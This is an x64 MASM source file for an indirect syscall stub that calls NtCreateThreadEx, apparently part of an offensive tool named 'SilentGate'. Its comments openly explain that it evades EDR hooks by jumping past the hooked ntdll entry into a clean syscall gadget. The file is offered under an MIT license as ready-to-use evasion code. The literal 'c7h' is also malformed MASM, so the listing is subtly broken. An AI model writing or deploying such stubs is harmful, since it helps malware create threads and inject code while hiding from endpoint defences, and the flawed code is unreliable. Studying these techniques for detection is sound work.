; ===========================================================
; SilentGate - Indirect Syscall Stub (x64 MASM)
; ===========================================================
; API    : NtCreateThreadEx
; SSN    : 199 (0xc7)
; Author : JarDan
; License: MIT
;
; HOW THIS WORKS:
;   Normal call path (EDR catches this):
;     Your code -> NtCreateThreadEx in ntdll -> [EDR HOOK] -> kernel
;
;   Indirect syscall path (EDR misses this):
;     Your code -> SG_NtCreateThreadEx -> loads SSN -> jumps into
;     clean ntdll stub -> syscall executes from ntdll space -> kernel
;
;   The EDR hook sits at the START of NtCreateThreadEx in ntdll.
;   We never touch that hooked address.
;   We jump PAST the hook into a clean syscall gadget in ntdll.
; ===========================================================

.code

EXTERN SG_NtCreateThreadEx_addr:QWORD  ; address of clean ntdll gadget

SG_NtCreateThreadEx PROC
    mov r10, rcx          ; mirror rcx into r10 (Windows x64 ABI)
    mov eax, c7h    ; load SSN 199 into eax
    jmp QWORD PTR [SG_NtCreateThreadEx_addr]  ; indirect jump to clean ntdll stub
SG_NtCreateThreadEx ENDP

END
